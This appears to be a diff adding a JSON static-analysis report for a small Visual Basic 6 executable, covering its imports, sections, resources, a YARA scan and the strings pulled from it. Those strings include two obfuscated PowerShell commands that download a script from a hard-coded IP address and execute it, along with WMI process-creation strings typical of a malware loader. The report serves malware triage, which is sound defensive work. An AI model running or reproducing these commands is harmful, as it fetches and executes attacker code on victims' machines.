@@ -1,0 +1,215 @@
+{
+  "delay_imports": {
+    "apis": [],
+    "dlls": []
+  },
+  "file_size": 28672,
+  "filename": "sample.bin",
+  "hash_reputation": {
+    "coverage": null,
+    "error": "OperationalError: reputation cache unavailable or invalid",
+    "hash_count": null,
+    "matched": null,
+    "source": null,
+    "status": "unavailable",
+    "updated_at": null,
+    "version": 1
+  },
+  "imports": {
+    "apis": [
+      "MSVBVM60.DLL!ordinal:626",
+      "MSVBVM60.DLL!EVENT_SINK_AddRef",
+      "MSVBVM60.DLL!EVENT_SINK_Release",
+      "MSVBVM60.DLL!EVENT_SINK_QueryInterface",
+      "MSVBVM60.DLL!__vbaExceptHandler",
+      "MSVBVM60.DLL!ProcCallEngine",
+      "MSVBVM60.DLL!ordinal:100"
+    ],
+    "dlls": [
+      "MSVBVM60.DLL"
+    ]
+  },
+  "parser_warnings": [
+    "Byte 0x00 makes up 82.4672% of the file's contents. This may indicate truncation / malformation."
+  ],
+  "pe": {
+    "architecture": "x86",
+    "compile_timestamp": "2026-05-28T17:46:51+00:00",
+    "entry_point": "0x104c",
+    "format": "PE32",
+    "image_base": "0x400000",
+    "is_dll": false,
+    "machine": "0x14c"
+  },
+  "resources": {
+    "entries": [
+      {
+        "captured_size": 20,
+        "code_page": 1200,
+        "error": null,
+        "file_offset": 21464,
+        "path": [
+          14,
+          1,
+          0
+        ],
+        "rva": "0x63d8",
+        "sha256": "feacd11a64303b7fbf720386aa52506f35b173ef0c5e8796780ddb917eac8dbf",
+        "size": 20,
+        "status": "complete"
+      },
+      {
+        "captured_size": 744,
+        "code_page": 1200,
+        "error": null,
+        "file_offset": 20720,
+        "path": [
+          16,
+          1,
+          1033
+        ],
+        "rva": "0x60f0",
+        "sha256": "46a6ab5583fbed68649571c7a692c457cd7b5caf0638f7c8bb13c3881cb81162",
+        "size": 744,
+        "status": "complete"
+      },
+      {
+        "captured_size": 4264,
+        "code_page": 1200,
+        "error": null,
+        "file_offset": 21484,
+        "path": [
+          3,
+          30001,
+          0
+        ],
+        "rva": "0x63ec",
+        "sha256": "38540fb7806694caf283e070578a235c55706ea1e32dea6d98f60f36f1c9845b",
+        "size": 4264,
+        "status": "complete"
+      }
+    ],
+    "version": 1
+  },
+  "schema_version": "1.2.0",
+  "sections": [
+    {
+      "characteristics": "0x60000020",
+      "entropy": 2.3963,
+      "executable": true,
+      "name": ".text",
+      "raw_size": 16384,
+      "readable": true,
+      "virtual_size": 13496,
+      "writable": false
+    },
+    {
+      "characteristics": "0xc0000040",
+      "entropy": 0,
+      "executable": false,
+      "name": ".data",
+      "raw_size": 0,
+      "readable": true,
+      "virtual_size": 2616,
+      "writable": true
+    },
+    {
+      "characteristics": "0x40000040",
+      "entropy": 1.3485,
+      "executable": false,
+      "name": ".rsrc",
+      "raw_size": 8192,
+      "readable": true,
+      "virtual_size": 5268,
+      "writable": false
+    }
+  ],
+  "sha256": "4544f0e53697d770eac70abad5790433d5e0b70282758c0b3383bf04a4f7f9ba",
+  "strings": {
+    "count": 64,
+    "sample": [
+      "!This program cannot be run in DOS mode.",
+      "Rich",
+      ".text",
+      "`.data",
+      ".rsrc",
+      "MSVBVM60.DLL",
+      "Project1",
+      "VB5!",
+      "Module1",
+      "MDIForm1",
+      "VBA6.DLL",
+      "MDIForm",
+      "C:\\Program Files (x86)\\Microsoft Visual Studio\\VB98\\VB6.OLB",
+      "EVENT_SINK_AddRef",
+      "EVENT_SINK_Release",
+      "EVENT_SINK_QueryInterface",
+      "__vbaExceptHandler",
+      "ProcCallEngine",
+      "*\\AC:\\Users\\CODE\\Desktop\\Powershell WMI\\Project1.vbp",
+      "EabkpSiBU",
+      "PsQHrLCtGQAnZAQjx",
+      "ElggfkUcjaZpfia",
+      "gvnYFHcJQiCPDpnmNvMzDdD",
+      "powershell iex(('ssissrsssm 91.92.240.125:8888/2j | isssesssx').replace('s',''))",
+      "rzoTec",
+      "Win32_ProcessStartup",
+      "SpawnInstance_",
+      "Win32_Process",
+      "winmgmts:\\\\.\\root\\cimv2",
+      "ShowWindow",
+      "mNvMDdDOIb",
+      "GEbvmdAjjQ",
+      "CrLCtGQznZAQj",
+      "Create",
+      "abkupSiUojYDMLQBuBgts",
+      "nJKTZCRyE",
+      "TrZCRyEYVBw",
+      "AysKHezZbm",
+      "EmbvmdqjjQQxG",
+      "KSwJIZdQwL",
+      "powershell iex(('ssissrsssm 91.92.240.125:8888/w5 | isssesssx').replace('s',''))",
+      "TtTfZrxh",
+      "GQAznAQjxfwimMA",
+      "BUoYDM",
+      "fiayGE",
+      "zoTdehE",
+      "hFGhqCfydTtTfZr",
+      "VS_VERSION_INFO",
+      "VarFileInfo",
+      "Translation",
+      "StringFileInfo",
+      "040904B0",
+      "CompanyName",
+      "To give an accurate answer",
+      "LegalCopyright",
+      "still popular for GPUs",
+      "LegalTrademarks",
+      "ProductName",
+      "FileVersion",
+      "11.00.5252",
+      "ProductVersion",
+      "InternalName",
+      "OriginalFilename",
+      "WMI.exe"
+    ],
+    "sample_limit": 64,
+    "truncated": false
+  },
+  "summary": {
+    "imported_api_count": 7,
+    "imported_dll_count": 1,
+    "section_count": 3,
+    "string_count": 64
+  },
+  "yara": {
+    "engine_version": "4.5.4",
+    "error": null,
+    "matches": [],
+    "rules_file": "wannacry.yar",
+    "rules_sha256": "af98f947ff400fe76f0d2f919749fba5f278d7a6d19c0f34de6eeddd44e52f91",
+    "status": "completed",
+    "version": 1,
+    "warnings": []
+  }
+}
